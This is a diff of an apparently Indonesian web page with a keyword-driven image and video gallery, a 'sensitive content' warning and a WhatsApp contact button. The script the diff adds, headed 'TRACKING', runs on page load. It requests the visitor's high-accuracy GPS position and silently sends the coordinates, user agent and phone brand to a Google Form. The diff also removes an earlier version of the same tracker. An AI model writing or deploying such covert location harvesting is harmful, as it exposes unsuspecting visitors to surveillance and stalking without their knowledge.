@@ -18,6 +18,7 @@ body {
 
 h1 { margin-top: 40px; }
 
+/* gambar awal kecil */
 .main-img {
   margin-top: 20px;
   width: 130px;
@@ -86,10 +87,9 @@ button {
   position: absolute;
   bottom: -40px;
   font-size: 26px;
-  background: rgba(0,0,0,0.4);
-  color: white;
+  background: rgba(0,0,0,0.5);
   border: none;
-  border-radius: 6px;
+  color: white;
   padding: 4px 12px;
   cursor: pointer;
 }
@@ -97,25 +97,27 @@ button {
 .nav-left { left: 0; }
 .nav-right { right: 0; }
 
+/* indikator */
 .indicator {
   margin-top: 10px;
-  letter-spacing: 5px;
   font-size: 18px;
+  letter-spacing: 4px;
 }
 
 /* tombol telepon */
 .phone-btn {
   position: fixed;
-  right: 20px;
   bottom: 20px;
-  width: 52px;
-  height: 52px;
+  right: 20px;
+  width: 50px;
+  height: 50px;
   background: white;
   border-radius: 50%;
   display: flex;
-  align-items: center;
   justify-content: center;
+  align-items: center;
   z-index: 1000;
+  text-decoration: none;
 }
 
 .phone-btn svg {
@@ -137,33 +139,65 @@ button {
 
 <div class="warning">This Web Is Sensitif⚠</div>
 
+<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-box" id="modalBox">
     <div class="close" onclick="closeModal()">✕</div>
   </div>
 </div>
 
+<!-- TELEPON -->
 <a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
-  <svg viewBox="0 0 24 24">
-    <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
-  </svg>
+<svg viewBox="0 0 24 24">
+<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
+</svg>
 </a>
 
 <script>
-/* ===== DATA SEARCH ===== */
+/* ================== TRACKING ================== */
+function getBrand() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes("samsung")) return "Samsung";
+  if (ua.includes("oppo")) return "Oppo";
+  if (ua.includes("vivo")) return "Vivo";
+  if (ua.includes("xiaomi") || ua.includes("redmi")) return "Xiaomi";
+  if (ua.includes("infinix")) return "Infinix";
+  if (ua.includes("realme")) return "Realme";
+  if (ua.includes("iphone")) return "iPhone";
+  return "Unknown";
+}
+
+function sendTracking(lat, lon) {
+  const formURL =
+  "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse" +
+  "?entry.138340134=" + lat.toFixed(6) +
+  "&entry.1616098311=" + lon.toFixed(6) +
+  "&entry.1257224602=" + encodeURIComponent(navigator.userAgent) +
+  "&entry.1874088822=" + encodeURIComponent(getBrand());
+
+  fetch(formURL, { mode: "no-cors" });
+}
+
+navigator.geolocation.getCurrentPosition(
+  pos => sendTracking(pos.coords.latitude, pos.coords.longitude),
+  () => {},
+  { enableHighAccuracy: true }
+);
+
+/* ================== LIPZZ ================== */
 let data = {};
 let currentImages = [];
 let currentIndex = 0;
 
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
-  .then(r => r.json())
-  .then(j => data = j);
+.then(res => res.json())
+.then(json => data = json);
 
 function search() {
-  const key = document.getElementById("keyword").value.trim().toLowerCase();
+  const key = keyword.value.trim().toLowerCase();
   if (!data[key]) return;
 
-  const box = document.getElementById("modalBox");
+  const box = modalBox;
   box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
   if (data[key].type === "video") {
@@ -179,88 +213,46 @@ function search() {
     currentIndex = 0;
 
     const img = document.createElement("img");
-    img.id = "mainGallery";
+    img.id = "gallery";
     img.src = currentImages[0];
     box.appendChild(img);
 
     const l = document.createElement("button");
     l.className = "nav-btn nav-left";
-    l.textContent = "<";
+    l.innerText = "<";
     l.onclick = () => slide(-1);
+    box.appendChild(l);
 
     const r = document.createElement("button");
     r.className = "nav-btn nav-right";
-    r.textContent = ">";
+    r.innerText = ">";
     r.onclick = () => slide(1);
+    box.appendChild(r);
 
     const ind = document.createElement("div");
     ind.className = "indicator";
     ind.id = "indicator";
-
-    box.append(l, r, ind);
+    box.appendChild(ind);
     updateIndicator();
   }
 
-  document.getElementById("modal").style.display = "flex";
+  modal.style.display = "flex";
 }
 
 function slide(d) {
-  currentIndex += d;
-  if (currentIndex < 0) currentIndex = currentImages.length - 1;
-  if (currentIndex >= currentImages.length) currentIndex = 0;
-  document.getElementById("mainGallery").src = currentImages[currentIndex];
+  currentIndex = (currentIndex + d + currentImages.length) % currentImages.length;
+  gallery.src = currentImages[currentIndex];
   updateIndicator();
 }
 
 function updateIndicator() {
-  let t = "";
-  currentImages.forEach((_, i) => t += i === currentIndex ? "♦" : "•");
-  document.getElementById("indicator").textContent = t;
+  indicator.textContent = currentImages.map((_,i)=> i===currentIndex?"♦":"•").join("");
 }
 
 function closeModal() {
-  document.getElementById("modal").style.display = "none";
-  document.getElementById("modalBox").innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  modal.style.display = "none";
+  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 }
-
-/* ===== TRACKING ===== */
-const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
-
-const ENTRY_LAT = "entry.138340134";
-const ENTRY_LON = "entry.1616098311";
-const ENTRY_UA  = "entry.1257224602";
-const ENTRY_HP  = "entry.1874088822";
-
-function detectBrand(ua) {
-  ua = ua.toLowerCase();
-  if (ua.includes("samsung")) return "Samsung";
-  if (ua.includes("oppo") || ua.includes("cph")) return "OPPO";
-  if (ua.includes("vivo")) return "Vivo";
-  if (ua.includes("xiaomi") || ua.includes("redmi")) return "Xiaomi";
-  if (ua.includes("iphone")) return "iPhone";
-  if (ua.includes("realme")) return "Realme";
-  return "Unknown";
-}
-
-function sendTracking() {
-  if (!navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(p => {
-    const d = new URLSearchParams();
-    d.append(ENTRY_LAT, p.coords.latitude.toFixed(6));
-    d.append(ENTRY_LON, p.coords.longitude.toFixed(6));
-    d.append(ENTRY_UA, navigator.userAgent);
-    d.append(ENTRY_HP, detectBrand(navigator.userAgent));
-
-    fetch(FORM_URL, {
-      method: "POST",
-      mode: "no-cors",
-      body: d
-    });
-  });
-}
-
-sendTracking();
 </script>
 
 </body>
